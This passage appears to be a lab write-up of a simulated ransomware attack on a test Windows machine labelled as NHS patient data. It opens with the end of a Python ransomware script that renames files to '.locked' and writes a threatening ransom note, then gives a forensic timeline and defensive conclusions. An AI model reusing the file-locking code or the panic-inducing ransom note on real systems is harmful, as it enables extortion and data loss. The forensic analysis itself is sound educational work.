        os.rename(file_path, file_path + ".locked") #filename is changed to locked type

# Create a ransom note, must be done after the locking, otherwise note will be locked as well
with open(os.path.join(target_dir, "README_RESTORE_FILES.txt"), "w") as f: #writes a new file in the directory path identified earlier
    f.write("Your data has been stolen and servers are encrypted. \nWe are the only ones that can unlock it for you.\n \nYou can gain access through initiation of negotiations with us.\n \nIf authorities are contacted, all data will be lost forever!\n")
```

<img width="3840" height="2160" alt="ransomware results" src="https://github.com/user-attachments/assets/e4d3a575-c813-4bf4-b5b3-534034349693" />


- The ransom note was created by studying several previous instances collected in a database on Group-IB (https://www.group-ib.com/resources/ransomware-notes/). All of the notes inform the user about what has happened, the group responsible, and that they are the only ones who can help unlock the files. Additionally, the notes outline the rules governing how the victims should proceed to ensure cooperation. These range in length and style of language, some friendly addressing to "friends" or formal, such as "Dear Management". Each will have different psychological effects. A more friendly approach might be trying to gain trust with the users for easier cooperation. The other approach might go with fear tactics, marking themselves as a threat to be taken seriously. The tactic used in this study was a threatening tone to induce panic, preying on quick, illogical decisions for financial gain. 

<img width="3840" height="2160" alt="ransom note" src="https://github.com/user-attachments/assets/49b632c1-e940-4cb1-93fb-d5b20e47c778" />

# Ransomware Attack Forensic Timeline

## Case Overview
- **Attack Type:** Ransomware
- **Target:** NHS Patient Data
- **Discovery Date:** October 29, 2025
- **Timeline Period:** September 24 to October 29, 2025

## Executive Summary

This forensic timeline outlines the progression of the ransomware attack, from initial reconnaissance to full system encryption. 

## Timeline of Events

### Phase 1: Reconnaissance and Initial Access

September 24, 2025, 19:04 GMT - Email Reconnaissance
- Activity: Phishing email campaign initiated
- Target: NHS staff members
- Evidence:
   - Attachment: "IMPORTANT OPEN.docm"
- Forensic Artefacts:
   - Malicious document VBA code
 
September 25, 2025, 11:37 GMT - Initial Compromise
- Activity: Employee andrewbertrude@outlook.com opens a malicious document
- System: Windows 11 (10.0.2.15)
- Evidence:
   - Macro execution in Microsoft Word

### Phase 3: Privilege Escalation and Credential Access

October 1, 2025, 17:09 - 17:13 GMT - Event Viewer Logs
- Activity: Event ID 10016 was logged several times during this date. This event warns that an application is trying to run without the approved permissions. This was most likely caused by the adversary trying to gain credential access and running outside software such as Mimikatz.
- Target: Windows System Logs
- Evidence:
<img width="3840" height="2160" alt="event viewer log - 10016" src="https://github.com/user-attachments/assets/e6577519-20df-4c68-83d4-2d1d049dcd1d" />

October 1, 2025, 17:10 GMT - SAM Creation
- Activity: The directory was checked for the SAM file. There was a positive hit in the config.
- Code:
  ```
  dir /s *sam* #searched all contents of the directory and subdirectories
  ```
- Evidence:
<img width="3840" height="2160" alt="search dir for sam" src="https://github.com/user-attachments/assets/9472dbc4-a0cf-4e83-b55d-3c96bb7073f9" />

October 8, 2025, 18:24 & 18:28 - Dump Files Created
- Activity: Directories were searched for files ending with .dmp. Two hits were found in the LiveKernelDumps directory.
- Code:
  ```
  dir C:\*.dmp /s /a #/a searches all directories, including hidden and system areas
  ```
- Evidence:
<img width="3840" height="2160" alt="dump files found" src="https://github.com/user-attachments/assets/efa3ca9e-23fb-4c96-bc84-dcff5394bb25" />

October 1, 2025 and October 8, 2025 - PowerShell Log Warning Flags Generated
- Activity: Event Viewer was used to check the PowerShell logs for any suspicious activity. By filtering the results, several warning flags were found with Event IDs 4104 and 4100. This was caused by an unauthorised operation trying to be performed. This is most likely due to the actor attempting to gain credential access through testing for vulnerable areas in the domain.
- Evidence:
<img width="3840" height="2160" alt="powershell logs" src="https://github.com/user-attachments/assets/b34e23bc-0c63-4b96-b54b-7f700f3fb9ee" />

### Phase 4: Exploration and Lateral Movement

October 17, 2025, 13:27 GMT - Event ID 4624 Created
- Activity: Several Event ID 4624 were created in the Event Viewer under the Security Log around this time. This signals that a user/process has successfully logged on to the system. However, under the events, a warning has been flagged by the system, warning that impersonation is likely due to unusual patterns or token manipulation being detected.
- Evidence:
  <img width="3840" height="2160" alt="event 4624 was found" src="https://github.com/user-attachments/assets/c56a03c0-985a-4b85-938b-4943ea40e3cd" />

October 17, 2025, 13:23 GMT - TCP SYN Packet
- Activity: By analysing the network transportation around the time of the attack through Wireshark, several TCP SYN packets were captured. This is the first packet sent in a TCP three-way handshake, and due to the amount present, it is evident that port scanning was used within the attack. 
- Code: ``` tcp.flags.syn == 1 && tcp.flags.ack == 0 ```
- Evidence:
  <img width="3840" height="2160" alt="syn scan" src="https://github.com/user-attachments/assets/8d507171-56ec-44e6-a9c2-59e36ad19879" />

October 17, 2025, 13:26 GMT - XMAS Scan
- Activity: Using Wireshark, network traffic was filtered for TCP packets that contain both FIN and URG flags. This is uncommon traffic that is found when using a specialised application and attempting to evade detection by using unusual flag combinations. There was a packet found that fit the filter, flagging the potential for a malicious event to have occurred around this time. 
- Code: ``` tcp.flags.fin == 1 && tcp.flags.urg == 1 ```
- Evidence:
  <img width="3840" height="2160" alt="xmas scan" src="https://github.com/user-attachments/assets/2330b6ae-088c-43da-ba4b-11f789a3144a" />

### Phase 5: Collection and Exfiltration

October 23, 2025, 16:34 GMT - Encoded Image Created
- Activity: Attacker created an image (PNG) encoded with confidential details using Steganography.
- Tool: Aperi'Solve using Zsteg (https://www.aperisolve.com/).
- Evidence:
<img width="3840" height="2160" alt="decoded evidence" src="https://github.com/user-attachments/assets/f9021236-b95c-40ef-bbd4-15634f3a5b2a" />

### Phase 6: Ransomware Deployment 

October 23, 2025, 18:53 GMT - Ransom Note Created
- Activity: Files were locked, and a note was left explaining what had happened. The message suggests not to contact the authorities, threatening to delete the data forever.
- Evidence:
<img width="2375" height="89" alt="image" src="https://github.com/user-attachments/assets/26e3ad5b-8812-48ef-92e7-78d9ab7523f9" />



# Conclusion

There is a high importance for security nowadays, which has influenced today's software, as shown by the Windows infrastructure that was used. It contained a sophisticated virus protection, which impacted some attack manoeuvres negatively, which then had to be rectified by either taking a different avenue or shutting it down long enough to make it through. This was successful, which is an issue. A company cannot rely on the given firewalls and antivirus software to keep its systems safe. There needs to be a vast defence-in-depth as discussed through the suggested controls to prevent, detect, and correct any instance of malware. Adversaries are able to adapt to the present prevention methods, and if this remains unchanged, then holes will start to appear as malicious actors test the edges of the barrier to find a weak spot. This is what happened to Co-Op, M&S, and the recent Harrods case, which was caused by a supplier. These attacks require constant vigilance through training, auditing, and patching to keep sensitive data secure. To protect the evolving digital world, due diligence is a required skill for forensic investigators, security administrators, and general users to avoid setting off the initial domino in the attack sequence. 
